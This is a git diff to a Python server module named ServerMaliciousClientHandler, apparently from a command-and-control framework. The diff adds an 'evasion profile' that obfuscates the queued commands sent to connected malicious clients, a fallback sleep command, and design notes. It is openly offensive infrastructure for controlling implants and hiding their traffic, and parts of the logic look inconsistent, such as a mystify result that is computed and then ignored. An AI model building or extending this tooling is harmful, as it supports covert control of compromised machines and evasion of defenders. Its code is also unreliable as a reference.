@@ -9,6 +9,9 @@
     
     Additionally, and this is newer, it updates JSON keys for the malicious client, with info on said malicious client for GUI stuff (i.e. client viewer)
 """
+## TEMP
+sleep_string = '''{"general": {"action": "sleep", "client_id": "", "client_type": "", "password": ""}, "conn": {"client_ip": "", "client_port": ""}, "msg": {"msg_to": "", "msg_content": "", "msg_command": "sleep", "msg_value": "", "msg_length": "", "msg_hash": ""}, "stats": {"latest_checkin": "", "device_hostname": "", "device_username": ""}, "security": {"client_hash": "", "server_hash": ""}}'''
+
 try:
     import math
     import logging
@@ -21,8 +24,12 @@ try:
 
     import Comms.CommsHandler
     import Utils.QueueHandler
+    import Utils.UtilsHandler
     import DataEngine.JsonHandler
     import DataEngine.DBHandler
+    import DataEngine.EvasionHandler
+
+    from pprint import pprint
 
 except Exception as e:
     print(f"[ServerMaliciousClientHandler.py] Import Error: {e}")
@@ -32,9 +39,11 @@ class ServerMaliciousClientHandler:
     """
     This is the class that handles all the malicious clients, a new instance is spawned for 
     each client that checks in.
+
+    sys_path: The system path as referenced FROM the server.py folder. (ex: 'C:\Logec\Server\' is the path.)
     """
     ## Technically gets called in prior thread. Can get funky with DB
-    def __init__(self):
+    def __init__(self, sys_path=None, evasion_profile_path = None):
         logging.debug("[MaliciousClientHandler.__init__()] This is a new class object.")
         self.clientsocket   = None
         self.ip             = None
@@ -42,6 +51,10 @@ class ServerMaliciousClientHandler:
         self.id             = None
         self.fullname       = None
         self.command_queue  = None  #Utils.QueueHandler.QueueHandler()
+        self.sys_path       = sys_path
+        self.evasion_profile_path = evasion_profile_path
+        #print(f"MCLIENT {self.sys_path} + {self.evasion_profile_path}")
+
 
         ## temp queue add ons
        # self.command_queue.enqueue("Test")
@@ -87,11 +100,16 @@ class ServerMaliciousClientHandler:
             ## DEBUG - temprarily here to create fake jobs
             self.command_queue.enqueue_client_row(client_name=self.fullname)
 
+
             ## write to DB response
             self.command_queue.add_response_from_client(response = raw_response_from_client, client_name=self.fullname)
 
             ## Debug queue statement, delete when ready
             #logging.debug(f"[MaliciousClientHandler.handle_client(): {self.id} ] Command Queue: {self.command_queue.queue}")
+
+            ## == Evasion Profile Setup == ##
+            self.evasion_profile = DataEngine.EvasionHandler.EvasionProfile(sys_path = self.sys_path, evasionprofile_file_path = self.evasion_profile_path)
+
 
             ##Final steps would be to send msg back to client
         except Exception as ge:
@@ -115,25 +133,55 @@ class ServerMaliciousClientHandler:
             That led to a weird delimited string that was fucked up. It now gets converted to a dict (see below) then the correct dict item ["msg"]["msg_command"] is passed
         '''
 
-        json_command    = self.command_queue.dequeue_next_cmd(client_name=self.fullname)
+        json_string_command    = self.command_queue.dequeue_next_cmd(client_name=self.fullname)
 
         ## janky python stuff here. If the json is legit, it returns the dict (which is true). If not, it returns False, and will failover to the sleep command
-        command         = DataEngine.JsonHandler.json_ops.from_json(json_command)
+        #command         = DataEngine.JsonHandler.json_ops.from_json(json_string_command)
 
-        if command:
-            logging.debug(f"[MaliciousClientHandler.handle_client(): {self.id} ] Sending: {command}")
-            msg_command = command["msg"]["msg_command"]
-            ## YOU FUCKING DIPSHIT command IS ALL JSON JESZUD FUCKING CRHSITS. IT NEEDS TO BE COMMAND.MSG.MSG_VALUE or something
-            msg_to_send = DataEngine.JsonHandler.json_ops.to_json(msg_command=msg_command)
-            Comms.CommsHandler.send_msg(msg=msg_to_send, conn=self.clientsocket)
+        if json_string_command:
+            ## run by evasionhandler.mystify()
+            try:
+                mystified_command = self.evasion_profile.mystify(json_string=json_string_command)
+
+            except Exception as e:
+                mystified_command = sleep_string
+                print(f"[ADD LATER] Errro with obsfuctaiong json command. Sending sleep. {e}")
+            
+            ## send to client
+            Comms.CommsHandler.send_msg(msg=mystified_command, conn=self.clientsocket)
+
         
         else:
             logging.debug(f"[MaliciousClientHandler.handle_client(): {self.id} ] Queue empty. Sending sleep")
-            msg_to_send = DataEngine.JsonHandler.json_ops.to_json(msg_command="sleep")
+            ## Creating the sleep json command, instead of using the input from the DB
+            msg_to_send = DataEngine.JsonHandler.json_ops.to_json(msg_command="sleep", timestamp=Utils.UtilsHandler.timestamp())
+            mystified_command = self.evasion_profile.mystify(json_string=json_string_command)
             Comms.CommsHandler.send_msg(msg=msg_to_send, conn=self.clientsocket)
 
             ## send a sleep object
         
 
 
-    
+'''
+steps
+
+
+Dequeue command (json string)
+
+passes to mall_prof()
+    - Modifies json string as neccesary
+        - unpacks & adds values, etc
+        - Repacks once done
+    - returns json string.
+
+modified json string is written to DB (modified_command).
+    - The modified_command feild is just a record of what is being sent, it does not actually have any data pulled from it
+
+Modified json is sent to client. 
+
+
+
+
+
+
+'''    
